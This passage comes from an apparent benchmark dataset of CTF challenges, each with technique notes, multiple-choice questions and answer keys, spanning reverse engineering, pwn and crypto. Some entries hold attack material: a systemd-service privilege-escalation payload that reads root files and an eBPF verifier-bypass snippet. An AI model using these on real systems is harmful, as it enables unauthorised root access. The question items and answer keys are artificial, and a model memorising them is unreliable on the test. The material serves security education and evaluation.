            "When handling web challenges involving custom cryptographic functions for address validation, carefully examine the conversion process implemented in the script from one numeral system to another. In this scenario, a Bitcoin address is processed through a series of conversions: first from base58 to decimal, then from decimal to hexadecimal. This understanding can guide the construction of a valid address that bypasses the check, especially when specific starting characters are required for the address. This process involves mathematical manipulations and understanding of numeral systems which are common in cryptographic challenges.",
            "The presence of arbitrary precision arithmetic operations (e.g., using `bcmath` in PHP) in cryptographic validation scripts suggests that precision matters significantly in the calculation. This means for a challenge, one may need to replicate the process with high precision in their scripting language of choice (for example, Python's `Fraction` module to maintain precision during decimal to hexadecimal conversion). This highlights the importance of choosing the right tools or libraries that can handle large numbers accurately when trying to forge or manipulate cryptographic strings or addresses.\n\nExample payload or address manipulation is not directly provided due to the complexity and specificity of the operation (involving conversion from base58 to decimal to hexadecimal and ensuring certain conditions like address length and starting characters are met). However, understanding the process detailed in the write-up allows for crafting a valid address given the conditions provided."
        ],
        "question": [
            "In a web security challenge focused on validating cryptocurrency addresses, the script implements a custom method which involves converting a Bitcoin address from base58 to decimal, and then to hexadecimal. Given this context, which step is crucial to ensure that the provided Bitcoin address passes the validation check?  - A. Converting the address directly from base58 to hexadecimal without intermediate decimal conversion. - B. Ensuring the hexadecimal string resulting from conversion has an even length before adding any necessary padding. - C. Diligently converting the address from base58 to decimal before converting it to hexadecimal, matching the specifics of the script's processing. - D. Ignoring the conversion process and focusing solely on manipulating the content of the Bitcoin address to include specific characters. ",
            "Considering the challenge involves the use of `bcmath` in PHP for arbitrary precision arithmetic operations during the process of validating cryptocurrency addresses, which alternative library or module is most appropriate for replicating this precision in Python to manipulate or validate cryptographic strings or addresses?  - A. Python's `random` module to generate numbers with the necessary precision. - B. Python's `Fraction` module to maintain precision during the conversion from decimal to hexadecimal. - C. Python's `math` module to handle the arithmetic operations without considering precision. - D. Python's `string` module to deal with the hexadecimal conversion irrespective of numerical precision. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "c_maths",
        "write_up": "dataset/raw/c_maths.md",
        "type": "reverse",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 465,
        "max_score": 499,
        "difficulty": 0.9318637274549099,
        "knowledge": [
            "When dealing with CTF challenges that have dynamic values changing based on the current time, ensure to synchronize the attack script's execution with the target's timing mechanism to maintain consistency. This approach is useful if the challenge seed values (such as random numbers) are based on the current time. Automating the process with a tool like GDB can efficiently extract variable values at runtime without manually solving the underlying algorithm.",
            "In reverse engineering challenges where the binary executes a series of comparisons to validate input, using GDB (GNU Debugger) to set breakpoints at the comparison instruction addresses can reveal the expected inputs directly from the program's memory or registers. This technique bypasses the need to understand the program's logic by providing a direct method to find the correct inputs to satisfy the program's conditions for success. This method is particularly effective in scenarios where the inputs are dynamically generated or unknown.\n   - Example commands to use in GDB for extracting values are:\n     - `x/s $rbp-0x95+8` for extracting strings directly from memory.\n     - `p/d $rax` for printing the integer value stored in the `EAX` register that is required for the next input."
        ],
        "question": [
            "In a Capture the Flag challenge where the output or required input changes with time, often seeded by the current system time, which of the following is a viable strategy to ensure successful exploitation or automation of the challenge?  - A. Hardcode expected values based on a static analysis of the binary. - B. Manually input values based on real-time calculations during the challenge. - C. Synchronize the attack script with the target's time to automate data extraction using a debugging tool. - D. Ignore time-based dynamic changes and focus on reverse engineering static parts of the binary. ",
            "When reverse engineering a binary in a CTF challenge that requires specific inputs based on comparisons carried out within the executable, which tactic enables bypassing the need for manual analysis to determine the correct input values?  - A. Modifying the binary to remove comparison checks. - B. Employing brute force to guess the required inputs. - C. Using a debugging tool like GDB to set breakpoints on comparison instructions and directly read necessary inputs from memory or registers. - D. Analyzing the binary's source code to deduce the correct inputs algorithmically. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "D0cker",
        "write_up": "dataset/raw/D0cker.md",
        "type": "pwn",
        "competition": [
            "justCTF/2021",
            "https://ctftime.org/event/1050/tasks/"
        ],
        "score": 231,
        "max_score": 500,
        "difficulty": 0.462,
        "knowledge": [
            "When communicating with a Unix socket file in a Docker container, you can use Python to interact with it by opening a socket connection directly to the file. This method is especially useful for scripting complex interactions or when certain utilities like `socat` are not available or insufficient. This approach allows for automated and programmable interactions with services exposed via Unix sockets in containerized environments. \n   \n   Example Python code snippet for connecting to a Unix socket:\n   ```python\n   import socket\n   sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n   sock.connect('/path/to/socket')\n   sock.sendall(b'MESSAGE')\n   response = sock.recv(1024)\n   print(\"Received:\", response.decode())\n   sock.close()\n   ```",
            "To find out specific container-related information from within a Docker container, such as the container ID or details about the file system layers, you can read various files and directories under `/proc` and `/sys`, as well as utilize the `cgroup` information. For container identification, `/proc/self/cgroup` can be used, and for filesystem details, `/proc/mounts` provides insights into the `overlay` filesystem used by Docker. This knowledge allows for the exploration of container environments and understanding Docker's operations at a deeper level.\n\n   Example commands to extract container ID and file system layer path:\n   - Extract container ID:\n     ```bash\n     cat /proc/self/cgroup | head -n1 | cut -d'/' -f3\n     ```\n   - Obtain Docker overlay filesystem layer path:\n     ```bash\n     cat /proc/self/mounts | grep upperdir | cut -d'=' -f2 | cut -d',' -f1\n     ```"
        ],
        "question": [
            "In a Docker containerized environment, to communicate with a service through a Unix socket `/oracle.sock` for solving a challenge, which Python code snippet facilitates the connection and interaction with that socket? - A. ```python import requests response = requests.get('unix:///oracle.sock') print(response.text) ``` - B. ```python import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('localhost', 8080)) sock.sendall(b'Hello, world') data = sock.recv(1024) print('Received', repr(data)) ``` - C. ```python import socket sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) sock.connect('/oracle.sock') sock.sendall(b'QUERY') response = sock.recv(1024) print(\"Received:\", response.decode()) sock.close() ``` - D. ```python import subprocess result = subprocess.run(['nc', '-U', '/oracle.sock'], stdout=subprocess.PIPE) print(result.stdout.decode()) ``` ",
            "When attempting to identify the Docker container ID and the overlay filesystem layer path from within a container, based on the commands given in the write-up, which set correctly represents the methods to retrieve the container ID and the path in the overlay filesystem? - A. Container ID: `cat /var/run/docker.sock | grep 'containers'`, Overlay path: `df -hT | grep overlay | awk '{print $7}'` - B. Container ID: `grep docker /etc/hosts | awk '{print $2}'`, Overlay path: `mount | grep overlay | awk '{print $3}'` - C. Container ID: `cat /proc/self/cgroup | head -n1 | cut -d'/' -f3`, Overlay path: `cat /proc/self/mounts | grep upperdir | cut -d'=' -f2 | cut -d',' -f1` - D. Container ID: `ifconfig docker0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`, Overlay path: `find / -name '*overlay*' | head -n 1` "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "d3bpf-v2",
        "write_up": "dataset/raw/d3bpf-v2.md",
        "type": "pwn",
        "competition": [
            "D3CTF/2022",
            "https://ctftime.org/event/1554/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting stack overflow vulnerabilities in the kernel's eBPF subsystem, manipulating the `len` argument of the `bpf_skb_load_bytes` function allows bypassing the verifier's checks to achieve a stack overflow. This approach exploits the fact that if a register, expected by the verifier to hold a certain value (e.g., 0), can be manipulated at runtime to hold a different value (e.g., 1), it can lead to incorrect security assumptions by the verifier, enabling vulnerabilities like stack overflows. Example manipulation involves using BPF instructions to alter register values subtly to bypass verifier checks, such as performing a right shift operation on a register believed by the verifier to be zero to pass checks, then using it as a length argument for stack overflow.",
            "In kernel exploitation challenges, particularly those involving eBPF, using a crash due to an illegal memory access (like accessing address 0) can indirectly leak kernel addresses, as the resulting \"soft panic\" might print useful address information. This relies on the kernel's behavior when handling crashes caused by eBPF programs, which does not result in a full kernel panic due to the setting of `/proc/sys/kernel/panic_on_oops` to 0 by default, thus allowing address leaks without causing a system reboot. This knowledge can be particularly useful for bypassing Kernel Address Space Layout Randomization (KASLR), by causing a controlled crash and observing the output for address leaks. This technique requires crafting specific eBPF instructions to trigger a crash while maximizing the likelihood of leaking useful information for further exploitation steps."
        ],
        "question": [
            "When exploiting a stack overflow in the eBPF subsystem, which function's misuse allows an attacker to bypass the verifier's checks? - A. `bpf_map_update_elem` - B. `bpf_skb_load_bytes` - C. `bpf_probe_read` - D. `bpf_adjust_head` ",
            "In the context of kernel exploitation, particularly with eBPF, what is the consequence of triggering a controlled crash due to illegal memory access? - A. It enables remote code execution without any further exploitation. - B. It automatically reboots the system without leaking any information. - C. It can lead to the kernel printing useful address information due to a \"soft panic.\" - D. It permanently disables the eBPF verifier for the current session. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "d3bpf",
        "write_up": "dataset/raw/d3bpf.md",
        "type": "pwn",
        "competition": [
            "D3CTF/2022",
            "https://ctftime.org/event/1554/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting vulnerabilities in Linux kernel ebpf (especially when `CONFIG_BPF_JIT_ALWAYS_ON` is enabled), leveraging an error in the verifier's judgment can allow the injection of illegal code to achieve privilege escalation. This approach targets a scenario where a patch introduces a vulnerability that misjudges certain conditions, such as misinterpreting an architecture-dependent behavior (e.g., shifting a 64-bit register by an operand greater than the architecture's limit, which can incorrectly set registers to a certain value that differs from the runtime behavior). Exploiting this requires careful crafting of ebpf bytecode that can pass verifier checks yet behaves differently at runtime due to specific architectural characteristics or introduced vulnerabilities in the verifier logic.",
            "To bypass the verifier's range detection for pointer arithmetic in ebpf exploits, a register with a runtime value different from what the verifier determines can be used. This discrepancy allows for manipulations that the verifier cannot accurately predict or detect, enabling the alteration of pointer arithmetic operations that could lead to memory corruption or unauthorized memory access. An example of this can involve adding an arbitrary value to a pointer by first multiplying a \"trusted\" register by any value and then adding or subtracting it to/from a pointer. The verifier might consider the operation safe (e.g., adding zero to the pointer), while in reality, a carefully crafted operation results in significant unintended modifications (e.g., `ptr + arbitrary_val`).\n\n**Example Payload Snippet:**  \n```\n// Bypassing verifier with a register assumed to represent zero\nBPF_MOV64_REG(BPF_REG_0, EXP_REG),  \nBPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),  \nBPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),  \nBPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),  \nBPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),\n```\nThis snippet assumes `EXP_REG` to have a runtime value of 1 but is considered 0 by the verifier due to a vulnerability, thereby facilitating an operation that bypasses the verifier's intended checks and allows executing unintended memory manipulations such as out-of-bounds access or pointer redirection."
        ],
        "question": [
            "In the context of Linux Kernel eBPF exploitation, a patch was introduced that changes the verifier's behavior regarding right shift operations on 64-bit registers. Specifically, the patch modifies how the verifier treats shift operations with operands greater than the architecture's limit (64). In the highlighted scenario, what incorrect behavior could be triggered by the modified verifier logic when performing a right shift operation, `BPF_REG_0 >> 64`? - A. The verifier correctly identifies the shift operation as invalid and rejects the eBPF program. - B. Despite the shift operand being greater than 63, the register value is set to 0 due to the patch, misinterpreting the architecture's shift operation behavior. - C. The verifier increases the register's value based on the operand's size, assuming larger shifts result in larger values. - D. No impact occurs; the verifier's behavior remains consistent with architectural specifications, treating large shifts as no-ops.",
            "Considering the exploit development for eBPF vulnerabilities, an attacker seeks to bypass verifier checks to manipulate pointer arithmetic operations. Given a scenario where `EXP_REG` is a register whose runtime value is 1, but the verifier assumes it to be 0, which operation could successfully exploit this discrepancy to bypass the verifier's range detection for pointer arithmetic? - A. Perform an addition of `EXP_REG` with a pointer directly, as the verifier accurately tracks arithmetic operations. - B. Subtract `EXP_REG` from a pointer, exploiting the fact that the verifier accurately assumes the operation would effectively be `pointer - 0`. - C. Multiply `EXP_REG` by an arbitrary value and add it to a pointer, where the verifier misinterprets the operation as a no-op, allowing unintended memory manipulation. - D. Divide a pointer by `EXP_REG`, assuming the verifier permits division operations in pointer arithmetic."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "DaHeck",
        "write_up": "dataset/raw/DaHeck.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 295,
        "max_score": 500,
        "difficulty": 0.59,
        "knowledge": [
            "When encountering a challenge that involves manipulations with character arrays and arithmetic operations, it is crucial to consider the possibility of reversing these operations. In cases where the challenge involves generating a specific outcome through arithmetic operations on Unicode characters, reverse-engineering the process can unveil the original input. This approach involves identifying the operations (such as subtraction) and then applying the inverse operation (addition in this instance) to retrieve the original characters. This technique is especially applicable in reverse engineering or cryptography challenges where the output is known, but the input needs to be discovered.  \n**Sample approach**: If `output[n] = input[n] - constant[n]` and the goal is to find `input[n]`, the reverse operation would be `input[n] = output[n] + constant[n]`.",
            "The usage of data types that support wrapping around on overflow, such as unsigned integers in programming languages like Python (using numpy's uint16 for instance), can be instrumental in reversing operations that involve underflow or overflow. This method is used to handle cases where operations in the challenge could result in values outside the standard range of the data type (e.g., negative values becoming large positive values due to underflow). In challenges dealing with calculations or transformations on character codes, applying the correct data type to handle overflow or underflow can lead to retrieving the original data values.  \n**Sample payload construction**: `cs += chr(np.uint16(-daheck[i] + heck[i]))` when reversing a character transformation that involves subtraction and potential underflow."
        ],
        "question": [
            "In a challenge dealing with character manipulations, if the operation applied was a subtraction to generate an output string from a given input string, which method would be most effective to reverse-engineer the input from the output? - A. Apply the modulo operation with each character of the output string. - B. Use the subtraction operation in reverse by subtracting the output from a constant. - C. Perform the inverse arithmetic operation, which in this case is addition, between the output characters and the known constants. - D. Encode the output string into a compatible encoding format and then decode it back.",
            "When working on reversing character transformation challenges, particularly those involving underflow or overflow in arithmetic operations, which Python data type and library can be correctly employed to handle such scenarios effectively? - A. Utilize `float64` from the Python standard `math` module. - B. Utilize `int32` from the Python standard `array` module. - C. Utilize `uint16` from the `numpy` library to correctly handle underflow or overflow. - D. Utilize `long` from the Python built-in types without any additional library."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "DamaS",
        "write_up": "dataset/raw/DamaS.md",
        "type": "crypto",
        "competition": [
            "ASIS/2021/Quals",
            "https://ctftime.org/event/1415/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with RSA encryption challenges where the public exponent 'e' seems large in comparison to 'N' and conventional attacks like Weiner's don't work, consider applying the Boneh-Durfee attack with guessed parameters. Initially, this might seem counterintuitive without any hints towards the size of the secret key 'd', but by adjusting parameters such as 'm' and 'delta', it is possible to find a solvable lattice and recover the secret key. This approach requires experimenting with 'm' and 'delta' values until a suitable set is found that enables the attack.",
            "For encryption schemes that involve operations with matrices, especially when the encryption involves polynomials mod N and matrix transformations, decryption can be achieved by utilizing the found private key to invert these operations. Once the private key is recovered, decrypt the ciphertext by reversing the matrix operations and polynomial transformations applied during encryption. This often involves raising matrices to the power of the private key, inverting them, and then applying these transformations in reverse to the ciphertext to recover the original message."
        ],
        "question": [
            "In an RSA encryption challenge, you notice that the public exponent 'e' is unusually large relative to the modulus 'N', and traditional RSA attacks are not effective. Which of the following methods is advised to try next, given that the size of the secret key 'd' is not apparent? - A. Increase the public exponent 'e' based on the size of 'N' and attempt brute force discovery of 'd'. - B. Apply the Boneh-Durfee attack with guessed values for parameters 'm' and 'delta' to find a small 'd'. - C. Utilize the Chinese Remainder Theorem to reduce the complexity of encryption calculations. - D. Perform frequency analysis on the ciphertext to identify patterns that may suggest the value of 'd'.",
            "Given an encryption scheme involving matrices where the encryption key and message are transformed via polynomials mod N and matrix operations, once the private key 'd' is obtained, what step is critical in decrypting the ciphertext? - A. Use the private key 'd' to perform a linear transformation on the encrypted matrices to recover the plaintext. - B. Execute simple substitution on the encrypted message using the private key 'd' as the substitution guide. - C. Reverse the matrix operations and polynomial transformations applied during encryption using the private key 'd'. - D. Apply a discrete Fourier transform on the encrypted message using the inverse of the private key 'd'."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "dangle-me",
        "write_up": "dataset/raw/dangle-me.md",
        "type": "reverse",
        "competition": [
            "pingCTF/2023",
            "https://ctftime.org/event/1987/tasks/"
        ],
        "score": 448,
        "max_score": 448,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with a dangling pointer vulnerability, particularly in scenarios where the function returns a pointer to a locally defined buffer, this can be exploited by forcing the program to enter recursive calls, leading to stack frames generation. Each recursive call pushes the stack closer to the point where arbitrary data can overwrite the return address, thus allowing for a successful redirection of the code flow. This technique can be used to bypass protections like NX (Non-Executable stack) by leveraging Return-oriented Programming (ROP) chains, such as a ret2libc attack, to execute arbitrary code. A general approach to exploit such vulnerabilities includes:\n\n    - Identifying a function that returns a dangling pointer.\n    - Triggering recursive calls to create a scenario where the stack can be controlled or influenced.\n    - Overwriting the return address or other crucial pointers on the stack to redirect execution flow.",
            "In scenarios where Position Independent Executable (PIE) protection is enabled, leaking an address from the binary's memory mapping allows for the resolution of the base address of the binary itself or other loaded binaries like libc. This information can be leveraged to bypass PIE by facilitating the calculation of function or gadget addresses required for a successful exploit. The technique of leaking addresses to resolve base addresses can be universally applied in exploiting binary vulnerabilities under PIE protection. A common strategy involves:\n\n    - Identifying a memory leak vulnerability or a mechanism to print out memory addresses.\n    - Using the leaked addresses to compute the base address of the binary or libc, thus defeating PIE.\n    - Crafting exploits that utilize these resolved addresses for code execution (e.g., building ROP chains, calling system functions).\n\nSample exploitation steps for leaking addresses and bypassing PIE might not include specific payloads due to the dynamic nature of memory addresses and the requirement for context-specific offsets and values. However, the methodology remains applicable across different binaries and challenges."
        ],
        "question": [
            "In a scenario where a binary with a dangling pointer vulnerability repeatedly calls a method recursively to handle game options, which of the following techniques would be best suited to exploit this vulnerability for arbitrary code execution? - A. Overwriting the data section of the binary to inject shellcode. - B. Utilizing format string vulnerabilities to leak stack canaries. - C. Generating enough recursive calls to control the stack and overwrite the return address with a ROP chain. - D. Creating a buffer overflow in the initial function call to overwrite global variables.",
            "Given a binary exploitation challenge where Position Independent Execution (PIE) is enabled, and a specific function in the binary leaks addresses which belong to the binary's memory mapping, what is the most effective next step towards developing an exploit? - A. Use the leaked addresses to determine the binary's or libc's base address, crucial for bypassing PIE. - B. Craft a stack smashing payload to directly jump to the binary's entry point. - C. Attempt to brute-force the base address of libc using common offsets. - D. Disassemble the entire binary in search of hardcoded addresses to bypass ASLR."
        ],
        "answer": [
            "C.",
            "A."
        ]
    },
    {
        "name": "DarkPearAI",
        "write_up": "dataset/raw/DarkPearAI.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a challenge involving Diffie-Hellman key exchange, conversion of given string messages into their decimal format is crucial for correctly solving discrete logarithm problems, as the accuracy of these conversions directly impacts the ability to solve for secret values. After conversion, tools such as SageMath can be employed to apply the `discrete_log` function for solving discrete logarithm issues, particularly useful when handling large numbers as in cryptographic challenges.",
            "In scenarios where the challenge relies on deriving a shared secret key through Diffie-Hellman key exchange, and when base (`g`), modulus (`n`), and transformed messages (`m1`, `m2`) are provided, the methodology involves first utilizing discrete logarithms to find the private keys (`a`, `b`). Once these are obtained, the shared secret key can be calculated using the formula `secretkey = pow(g, a*b) % n`. This approach highlights the importance of understanding and applying discrete logarithm techniques in cryptography challenges to decrypt or derive required information."
        ],
        "question": [
            "In a cryptographic challenge, why is it crucial to convert string messages into their decimal representation before solving problems involving Diffie-Hellman key exchange? - A. To simplify the encryption process. - B. Because the decimal format is required for the `discrete_log` function in SageMath to work correctly. - C. It isn't necessary; hexadecimal is preferred. - D. To ensure compatibility with non-cryptographic algorithms.",
            "Given the base (`g`), modulus (`n`), and transformed messages (`m1`, `m2`) in a Diffie-Hellman key exchange scenario, which step is correct for deriving the shared secret key? - A. Calculate `secretkey = (g + a + b) % n`. - B. Use `secretkey = pow(g, a*b) % n` after obtaining `a` and `b` through discrete logarithm. - C. Directly compute `secretkey = g^(m1*m2) % n`. - D. Find the shared secret key by adding `m1` and `m2` together."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Dataflow Programming Christmas Edition",
        "write_up": "dataset/raw/Dataflow Programming Christmas Edition.md",
        "type": "reverse",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 454,
        "max_score": 591,
        "difficulty": 0.7681895093062606,
        "knowledge": [
            "When facing challenges involving custom programming languages or interpreters, especially in reverse engineering tasks, manual code analysis can be crucial. This involves identifying patterns in the code that correspond to operations on inputs or constants that lead to the desired output. If an interpreter or full understanding of the programming logic is too complex or time-consuming to develop, focusing on patterns that relate inputs (such as flag characters) to constants or specific operations can be an effective strategy.",
            "In challenges involving encoded or encrypted strings where the encoding or encryption process is split into blocks or segments (often visible in the challenge code or logic), each block may correspond to operations on individual characters or subsets of the input string. These blocks can often be reverse-engineered independently to reconstruct the original string. Identifying these blocks and understanding their operations (such as arithmetic or bitwise operations) on known values or inputs can allow for the piecemeal decryption or decoding of the input string.\n\nSample payload for reverse engineering through manual analysis (based on the challenge's logic):\n- To reconstruct the flag character at position 2: `flag[2] = chr((10 + 1) * 10) = 'n'`\n- For the flag character at position 9: `flag[9] = chr(204 >> 2) = '3'`"
        ],
        "question": [
            "In a challenge where the objective is to reverse engineer a string using a custom programming language without writing a full interpreter, which approach is considered effective for manual analysis? - A. Writing a full compiler to translate each line of code into a high-level language. - B. Identifying patterns that relate inputs to constants or specific operations to determine output. - C. Ignoring specific operations and focusing solely on the size of the code blocks. - D. Trying random inputs until the correct output is discovered by chance.",
            "In a reverse engineering challenge where the encoding process of a string is divided into blocks, each with arithmetic or bitwise operations, what is the primary method for decoding or reconstructing the original string? - A. Summing up all the ASCII values found in the blocks and dividing by the number of blocks. - B. Reversing each block's operations in sequence starting from the last block. - C. Identifying and reverse-engineering each block independently based on the operations it performs on known values or inputs. - D. Applying a universal decoding algorithm that does not consider the specifics of each block's operations."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Day 17_ Naughtykit",
        "write_up": "dataset/raw/Day 17_ Naughtykit.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "Identifying the operating system and its version can be crucial for exploiting known vulnerabilities. If a system's UID value is abnormally high and runs on a specific OS version, researching CVEs related to these conditions may lead to potential exploit avenues. This knowledge is specifically applicable when dealing with systems that may not have patched known vulnerabilities.",
            "For privilege escalation on systems affected by CVE-2018-19788 and similar vulnerabilities, users can exploit the flaw by crafting a malicious systemd service file that executes desired commands with elevated privileges. This method requires the attacker to have the ability to create and manipulate service files on the vulnerable system.\n\nExample Payload for Privilege Escalation:\n```bash\ncat <<EOF > /home/elf/pwn.sh\n#!/bin/sh\nls -al /root/ > /home/elf/root_dir  \ncat /root/flag > /home/elf/flag  \nEOF\n\nchmod 777 /home/elf/pwn.sh\n\ncat <<EOF > /home/elf/pwn.service  \n[Unit]  \nDescription=pwn  \nAfter=network.target  \n  \n[Service]  \nExecStart=/home/elf/pwn.sh  \nExecReload=/home/elf/pwn.sh  \nRestart=on-failure  \nRuntimeDirectoryMode=0755  \n  \n[Install]  \nWantedBy=multi-user.target  \nAlias=pwn.service  \nEOF\n\nsystemctl enable /home/elf/pwn.service  \nsystemctl start pwn.service\n```"
        ],
        "question": [
            "When analyzing a system for potential vulnerabilities, why is it important to identify the operating system and its version, especially when the UID value is notably high? - A. To choose the most compatible software for installation. - B. To ensure compatibility with the system\u2019s hardware. - C. To explore known vulnerabilities and corresponding exploits for that OS and version. - D. To optimize system performance and resource management.",
            "In the context of exploiting CVE-2018-19788 on a vulnerable system, which of the following best describes a method for privilege escalation using systemd service files? - A. Modifying existing systemd service files to redirect their execution paths to attacker-controlled scripts. - B. Creating a new systemd service file that executes commands with elevated privileges by taking advantage of the vulnerability. - C. Disabling security features of systemd to allow unrestricted execution of services. - D. Using a systemd service file to change user permissions and gain root access without exploiting any specific vulnerability."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Day 1_ Vault1",
        "write_up": "dataset/raw/Day 1_ Vault1.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving decoding or determining the sequence of operations on a set of elements, consider using a brute-force approach where possible. Automate the computation of each element's state based on given operations or patterns. This can be applied especially when dealing with rotational or cyclical transformation patterns, like the spinning of wheels, where the state of each wheel is changed based on input and might loop over a limited set of states.",
            "When handling networked services, especially those employing protocols like telnet for interaction, consider using asynchronous I/O libraries such as `asyncio` with `telnetlib` or `telnetlib3` in Python. This enables efficient handling of I/O operations, including sending commands and receiving responses without blocking, which is crucial in challenges that require automated, rapid interaction with a service to test various inputs or brute-force a correct sequence of actions."
        ],
        "question": [
            "In a challenge that simulates a secure vault with wheels that accept a spin amount, which approach allows for determining the correct sequence of spins to open the vault? - A. Implementing a linear regression analysis on spin amounts and their results - B. Using a randomized algorithm to guess the correct spin for each wheel without any computation - C. Writing a script that automates the computation of wheel spins based on their cyclical transformation pattern, applying a brute-force method - D. Manually calculating the spin amount for each wheel and entering them one by one",
            "Considering a challenge that involves interacting with a network service using Telnet, which Python library combination is best suited for handling asynchronous I/O operations required to send commands and await responses efficiently? - A. Using `requests` and `BeautifulSoup` to parse and interact with the Telnet service - B. Employing `asyncio` with `telnetlib3` for efficient asynchronous communication with the service - C. Relying solely on `synchronous` I/O operations with the standard `telnetlib` - D. Utilizing `socket` for creating low-level TCP connections without handling asynchrony"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Day 22_ Elvish art",
        "write_up": "dataset/raw/Day 22_ Elvish art.md",
        "type": "pwn",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When constructing shellcode under restricted conditions, such as a limited set of usable characters or byte values, review the available instructions and their opcodes to identify usable instructions. This is especially relevant in scenarios with filters or security mechanisms that block conventional shellcode. For instance, if the character set excludes null bytes or common shellcode bytes, one can manually assemble shellcode using allowed instructions, like `sub`, `inc`, `dec`, and specific register manipulations. This process might involve creative use of arithmetic or logic instructions to construct required memory addresses or data.",
            "For scenarios requiring dynamic modification or self-modification of shellcode, utilize register operations and memory write instructions creatively. If direct insertion of desired shellcode bytes is not possible due to character restrictions, use register operations (`push`, `pop`, `inc`, `dec`) to set register values to desired states, then write these values into the shellcode space in memory. This method is useful when the execution environment or input filtering limits direct control over the shellcode bytes placed into memory. An illustrative part of this approach involves setting a register to zero using `pushad` followed by `pop` into the wanted register, then decrementing or incrementing it to the desired byte value and writing this byte into the memory space designated for shellcode execution."
        ],
        "question": [
            "In a scenario where you are assembling shellcode with a restricted set of byte values, which of the following instructions could potentially be used to adjust the value of `eax` for pointing to a different memory location, considering the character restrictions? - A. `add eax, 0x12345678` - B. `sub eax, 0x4b3e4040` - C. `xor eax, eax` - D. `mov eax, 0xffffeeee`",
            "When creating or modifying shellcode under restrictions, such as a limited character set, and direct modification of shellcode bytes is not feasible, which approach is correct for adjusting a register's value to a specific byte value before writing it into memory designated for shellcode execution? - A. Use a combination of `mov` instructions to directly set the value of registers to the desired shellcode bytes. - B. Employ `push`, `pop`, `inc`, `dec` operations to adjust register values and `mov` instructions to write these to shellcode space. - C. Utilize `pushad` followed by `pop` into the desired register, increment or decrement it to the target byte value, and then write this byte into memory. - D. Rely on high-level programming constructs such as loops or conditional statements within the shellcode to dynamically alter its behavior."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Day 24_ Santa's vault 2",
        "write_up": "dataset/raw/Day 24_ Santa's vault 2.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge involving dynamic values that must be manipulated to match certain targets, automating the process through scripting is essential. This applies particularly in scenarios where the solution involves interacting with a network service or a complex input/output system. Start by mapping out how different inputs affect the dynamic values, then use these mappings to calculate the necessary inputs to achieve the target values. This approach is useful in CTF challenges that require iteratively solving puzzles or manipulating game states to reach a certain condition.",
            "The use of Python's socket programming for interacting with network services can be extended to solve challenges that involve real-time data manipulation based on server responses. After establishing a connection and receiving data, dynamically parse server responses to determine the next course of action. This includes reading and interpreting values, calculating the necessary inputs to achieve a desired outcome, and sending these inputs back to the server. This method is particularly effective in challenges where the goal is to automate the process of reaching a certain state or solving a puzzle through a network service. \n\n    Sample Python snippet for interacting with a network service:\n    ```python\n    import socket\n\n    def connect_to_service(host, port):\n        s = socket.socket()\n        s.settimeout(5)\n        s.connect((host, port))\n        return s\n\n    def send_and_receive_data(socket, data):\n        socket.send(data.encode('utf-8'))\n        response = socket.recv(1024).decode('utf-8')\n        return response\n    ```\n    This snippet demonstrates establishing a connection to a service and sending/receiving data, which can be adapted for various challenges requiring network interaction."
        ],
        "question": [
            "In a CTF challenge involving dynamic values and targets, where each round requires a specific combination of inputs to match the target, how should you proceed to automate finding the correct combination of inputs? - A. Manually try each combination of inputs for every round and track the results in a spreadsheet. - B. Utilize a brute force method to randomly generate inputs until the correct combination is found by chance. - C. Write a script that maps how different inputs affect the values, then calculate the necessary inputs to achieve the target values. - D. Ignore the dynamics and focus on guessing the target values based on common patterns or sequences.",
